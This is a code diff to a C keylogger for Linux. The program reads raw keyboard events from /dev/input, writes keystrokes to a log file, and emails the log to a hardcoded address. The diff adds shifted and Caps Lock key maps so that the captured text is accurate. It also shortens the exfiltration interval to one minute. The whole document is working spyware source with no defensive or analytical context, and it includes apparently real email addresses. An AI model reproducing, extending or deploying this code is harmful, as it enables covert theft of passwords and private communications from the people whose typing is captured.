@@ -12,6 +12,9 @@
 #define RSIZ 100
 #define FROM_MAIL     "doi2xuyenviet7@gmail.com"
 #define TO_MAIL       "nguyenngocdoanh1998@gmail.com"
+#define SHIFT(key) ( key == KEY_LEFTSHIFT || key == KEY_RIGHTSHIFT)
+#define CAPSLOCK(key) ( key == KEY_CAPSLOCK )
+
 const char b64chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 char event_file_path[18] = "/dev/input/event";
 
@@ -162,7 +165,7 @@ char* find_key(int code){
         case 39: return ";";
         case 40: return "'";
         case 41: return "`";
-        case 42: return "[SHIFT]";
+        //case 42: return "[SHIFT]";
         case 43: return "\\";
         case 44: return "z";
         case 45: return "x";
@@ -174,10 +177,143 @@ char* find_key(int code){
         case 51: return ",";
         case 52: return ".";
         case 53: return "/";
-        case 54: return "[SHIFT]";
+        //case 54: return "[SHIFT]";
         case 55: return "*";
         case 57: return "[SPACE]";
-        case 58: return "[CAPSLOCK]";
+        //case 58: return "[CAPSLOCK]";
+        case 102: return "[HOME]";
+        case 103: return "[UP]";
+        case 104: return "[PGUP]";
+        case 105: return "[LEFT]";
+        case 106: return "[RIGHT]";
+        case 107: return "[END]";
+        case 108: return "[DOWN]";
+        case 109: return "[PGDN]";
+        default: return "";
+    }
+}
+
+char* find_key_shifted(int code){
+    switch(code){
+        case 2: return "!";
+        case 3: return "@";
+        case 4: return "#";
+        case 5: return "$";
+        case 6: return "%";
+        case 7: return "^";
+        case 8: return "&";
+        case 9: return "*";
+        case 10: return "(";
+        case 11: return ")";
+        case 12: return "_";
+        case 13: return "+";
+        case 14: return "[BACKSPACE]";
+        case 15: return "[TAB]";
+        case 16: return "Q";
+        case 17: return "W";
+        case 18: return "E";
+        case 19: return "R";
+        case 20: return "T";
+        case 21: return "Y";
+        case 22: return "U";
+        case 23: return "I";
+        case 24: return "O";
+        case 25: return "P";
+        case 26: return "{";
+        case 27: return "}";
+        case 28: return "[ENTER]";
+        case 29: return "[CTRL]";
+        case 30: return "A";
+        case 31: return "S";
+        case 32: return "D";
+        case 33: return "F";
+        case 34: return "G";
+        case 35: return "H";
+        case 36: return "J";
+        case 37: return "K";
+        case 38: return "L";
+        case 39: return ":";
+        case 40: return "\"";
+        case 41: return "~";
+        case 43: return "|";
+        case 44: return "Z";
+        case 45: return "X";
+        case 46: return "C";
+        case 47: return "V";
+        case 48: return "B";
+        case 49: return "N";
+        case 50: return "M";
+        case 51: return "<";
+        case 52: return ">";
+        case 53: return "?";
+        case 57: return "[SPACE]";
+        //case 58: return "[CAPSLOCK]";
+        case 102: return "[HOME]";
+        case 103: return "[UP]";
+        case 104: return "[PGUP]";
+        case 105: return "[LEFT]";
+        case 106: return "[RIGHT]";
+        case 107: return "[END]";
+        case 108: return "[DOWN]";
+        case 109: return "[PGDN]";
+        default: return "";
+    }
+}
+
+char* find_key_capslock(int code){
+    switch(code){
+        case 2: return "1";
+        case 3: return "2";
+        case 4: return "3";
+        case 5: return "4";
+        case 6: return "5";
+        case 7: return "6";
+        case 8: return "7";
+        case 9: return "8";
+        case 10: return "9";
+        case 11: return "0";
+        case 12: return "-";
+        case 13: return "=";
+        case 14: return "[BACKSPACE]";
+        case 15: return "[TAB]";
+        case 16: return "Q";
+        case 17: return "W";
+        case 18: return "E";
+        case 19: return "R";
+        case 20: return "T";
+        case 21: return "Y";
+        case 22: return "U";
+        case 23: return "I";
+        case 24: return "O";
+        case 25: return "P";
+        case 26: return "{";
+        case 27: return "}";
+        case 28: return "[ENTER]";
+        case 29: return "[CTRL]";
+        case 30: return "A";
+        case 31: return "S";
+        case 32: return "D";
+        case 33: return "F";
+        case 34: return "G";
+        case 35: return "H";
+        case 36: return "J";
+        case 37: return "K";
+        case 38: return "L";
+        case 39: return ";";
+        case 40: return "'";
+        case 41: return "`";
+        case 43: return "\\";
+        case 44: return "Z";
+        case 45: return "X";
+        case 46: return "C";
+        case 47: return "V";
+        case 48: return "B";
+        case 49: return "N";
+        case 50: return "M";
+        case 51: return ",";
+        case 52: return ".";
+        case 53: return "/";
+        case 57: return "[SPACE]";
         case 102: return "[HOME]";
         case 103: return "[UP]";
         case 104: return "[PGUP]";
@@ -294,27 +430,46 @@ int send_email(){
 
 void *trigger_send_email(){
     while(1){
+        sleep(60);
         send_email();
-        sleep(15*60);
     }
 }
 
 void *keylogger(){
     find_event_file_path();
-    //struct timeval start_time;
-    //gettimeofday(&start_time, 0);
-    //struct timeval current_time;
 
     FILE * fp_out = fopen("log.txt", "a");
     struct input_event event;
+    int shift_flag = 0;
+    int capslock_flag = 0;
+    int capslock_count = 2;
     int events = open(event_file_path, O_RDONLY);
     while(1){
         read(events,&event, sizeof(event));
         if(event.type == 1 && event.value == 1){
-            //printf("Key: %i State: %i\n",event.code,event.value);
-            //printf("Typed: %s\n",find_key(event.code));
-            fputs(find_key(event.code), fp_out);
+            if (SHIFT(event.code))
+                shift_flag = 1;
+            if (CAPSLOCK(event.code)){
+                capslock_flag = 1;
+                capslock_count++;
+                //printf("%s\n","CAPSLOCK ON");
+            }
+            if (!shift_flag && capslock_flag && !SHIFT(event.code))
+                fputs(find_key_capslock(event.code), fp_out);
+            if (shift_flag && !capslock_flag && !SHIFT(event.code))
+                fputs(find_key_shifted(event.code), fp_out);
+            else if ((shift_flag == capslock_flag) && !SHIFT(event.code))
+                fputs(find_key(event.code), fp_out);
             fflush(fp_out);
+        }
+        else if (event.type == 1 && event.value == 0){
+            if (SHIFT(event.code)){
+                shift_flag = 0;
+            }
+            if (CAPSLOCK(event.code) && (capslock_count % 2 == 0)){
+                capslock_flag = 0;
+                printf("CAPSLOCK OFF\n");
+            }
         }
         //gettimeofday(&current_time, 0);
         //if (current_time.tv_sec - start_time.tv_sec > 20){
@@ -329,7 +484,6 @@ void *keylogger(){
 int main() {
     pthread_t tid_keylogger;
     pthread_create(&tid_keylogger, NULL, keylogger, (void *)&keylogger);
-
     pthread_t tid_trigger_send_email;
     pthread_create(&tid_trigger_send_email, NULL, trigger_send_email, (void *)&trigger_send_email);
 
